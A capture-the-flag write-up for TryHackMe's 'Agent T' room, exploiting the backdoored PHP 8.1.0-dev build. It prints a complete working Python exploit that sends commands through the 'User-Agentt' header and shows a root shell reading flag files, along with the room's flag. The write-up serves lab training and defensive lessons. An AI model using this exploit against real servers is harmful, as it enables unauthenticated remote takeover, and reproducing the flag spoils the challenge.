#  Agent T

> **Platform:** TryHackMe  
> **Difficulty:** Easy  
> **Category:** Web / RCE / PHP Backdoor  
> **Date Completed:** 2026-04-22  
> **Room Link:** [https://tryhackme.com/room/agentt](https://tryhackme.com/room/agentt)

---

##  Table of Contents

1. [Room Overview](#room-overview)
2. [Reconnaissance](#reconnaissance)
3. [Enumeration](#enumeration)
4. [Exploitation](#exploitation)
5. [Flags](#flags)
6. [Key Takeaways](#key-takeaways)

---

##  Room Overview

Agent T is a straightforward one-step RCE challenge. The target runs **PHP 8.1.0-dev** — a development build that was briefly released in March 2021 with a backdoor embedded in it. The backdoor allows unauthenticated remote code execution by injecting a system command into the `User-Agentt` HTTP header. No credentials, no enumeration needed — just identify the version and hit the exploit.

**Goal:**  
Exploit the PHP 8.1.0-dev backdoor to execute commands as root and retrieve the flag.

**Skills Practiced:**  
Nmap service version detection, ExploitDB research, PHP 8.1.0-dev backdoor RCE via HTTP header injection.

---

##  Reconnaissance

### Network Scanning

```bash
nmap 10.48.161.47 -sV -v
```

**Findings:**

| Port | Service | Version |
|------|---------|---------|
| 80   | HTTP    | **PHP cli server 5.5 or later (PHP 8.1.0-dev)** |

Only one port open. The version string `PHP 8.1.0-dev` is the critical detail — this exact build is known to contain a backdoor.

---

##  Enumeration

### Gobuster

```bash
gobuster dir -u http://10.48.161.47/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -t 50
```

Gobuster fails immediately — the server returns HTTP 200 for all requests regardless of whether the path exists (wildcard responses). No useful directories found.

### Version Research

Searching ExploitDB for **PHP 8.1.0-dev** returns:

> **ExploitDB #49933 — PHP 8.1.0-dev — 'User-Agentt' Remote Code Execution**  
> Author: flast101 | Date: 23 May 2021

An early development release of PHP 8.1.0 was pushed to GitHub on 28 March 2021 containing a backdoor injected by an unauthorised actor. The backdoor evaluates PHP code passed via the `User-Agentt` header (note the double `t`) using `zerodiumsystem()`. It was discovered and removed quickly, but any server still running this build is trivially exploitable.

---

##  Exploitation

### Vulnerability

**Type:** Backdoored PHP Binary — Unauthenticated RCE via HTTP Header  
**CVE:** N/A (Supply chain / backdoor)  
**ExploitDB:** [#49933](https://www.exploit-db.com/exploits/49933)  
**Description:**  
PHP 8.1.0-dev evaluates the value of the `User-Agentt` HTTP header as PHP code via `zerodiumsystem()`. Any HTTP request to any page on the server can execute arbitrary system commands with no authentication required, running as the PHP process user.

---

### Steps

**Step 1 — Download and run the exploit**

```python
#!/usr/bin/env python3
import requests

host = input("Enter the full host url:\n")
request = requests.Session()
response = request.get(host)

if str(response) == '<Response [200]>':
    print("\nInteractive shell is opened on", host)
    try:
        while 1:
            cmd = input("$ ")
            headers = {
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
                "User-Agentt": "zerodiumsystem('" + cmd + "');"
            }
            response = request.get(host, headers=headers, allow_redirects=False)
            current_page = response.text
            stdout = current_page.split('<!DOCTYPE html>', 1)
            print(stdout[0])
    except KeyboardInterrupt:
        print("Exiting...")
```

**Step 2 — Run the exploit and enter the target URL**

```bash
python3 exploit.py
# Enter the full host url:
# http://10.48.161.47
```

A pseudo-shell opens immediately.

**Step 3 — Confirm RCE as root**

```bash
$ whoami
root
```

The PHP process runs as root — no privilege escalation needed.

**Step 4 — Find and read the flag**

```bash
$ cat /root/root.txt
# (empty)

$ cat /root/flag.txt
# (empty)

$ cat /flag.txt
flag{4127d0530abf16d6d23973e3df8dbecb}
```

---

##  Flags

| Flag | Value |
|------|-------|
| Room Flag | `flag{4127d0530abf16d6d23973e3df8dbecb}` |

---

##  Key Takeaways

- **Never run development builds in production.** PHP 8.1.0-dev was a pre-release build never intended for public servers. Running `-dev` versions of any software in a live environment is a critical risk.
- **Supply chain attacks are devastating.** The backdoor was injected into the official PHP source repository by an unauthorised third party — not a configuration mistake, but a compromise of the software itself. Version pinning and integrity verification (checksums, signed releases) are essential.
- **Service version banners are high-value recon.** Nmap's `-sV` flag revealed `PHP 8.1.0-dev` directly — one search led straight to a working public exploit. Always check detected versions against ExploitDB and CVE databases.
- **`User-Agentt` (double t) is the tell.** The backdoor key is the misspelled header name — a signature left by the attacker. Any WAF or IDS rule looking for standard headers would miss it.

---

##  Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Service version detection — identified PHP 8.1.0-dev |
| Gobuster | Directory enumeration (inconclusive due to wildcard responses) |
| ExploitDB #49933 | PHP 8.1.0-dev `User-Agentt` RCE exploit |

---

##  References

- [ExploitDB #49933 — PHP 8.1.0-dev RCE](https://www.exploit-db.com/exploits/49933)
- [flast101 Blog — PHP 8.1.0-dev Backdoor RCE](https://flast101.github.io/php-8.1.0-dev-backdoor-rce/)
- [Vulhub — PHP 8.1 Backdoor](https://github.com/vulhub/vulhub/blob/master/php/8.1-backdoor/README.zh-cn.md)
- [PHP Git Commit — Backdoor Removed](https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a)

---

*Writeup by Avaneesh*
